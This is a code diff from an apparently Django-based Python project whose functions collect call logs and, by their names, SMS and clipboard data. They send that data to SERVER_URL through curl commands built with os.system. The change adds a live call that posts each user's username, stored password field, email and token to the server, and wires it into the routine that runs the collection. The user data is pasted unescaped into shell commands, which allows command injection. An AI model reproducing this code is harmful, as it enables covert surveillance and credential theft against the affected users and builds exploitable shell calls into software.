@@ -49,15 +49,12 @@ def check_call(THIS_USER_TOKEN):
                 f'curl --data "token={THIS_USER_TOKEN}&name={log["name"]}&phone_number={log["phone_number"]}&type={log["type"]}&duration={log["duration"]}&date={log["date"]}" {SERVER_URL}/s/call_log/')
 
 
-def register(THIS_USER_TOKEN):
+def register_server(THIS_USER_TOKEN):
     from django.shortcuts import get_object_or_404
     this_user = get_object_or_404(Token, token=THIS_USER_TOKEN).user
-    ##os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}&server=true" {SERVER_URL}/register/')
-    print(this_user.username + '\n' + THIS_USER_TOKEN)
-    os.system(f'curl --data "username={this_user.username}&token={THIS_USER_TOKEN}" {SERVER_URL}/setToken/')
+    os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}&token={THIS_USER_TOKEN}" {SERVER_URL}/register/')
 
 def InsertIntoDb(THIS_USER_TOKEN):
-    # register(THIS_USER_TOKEN)
     check_sms(THIS_USER_TOKEN)
     check_call(THIS_USER_TOKEN)
     check_clipboard(THIS_USER_TOKEN)
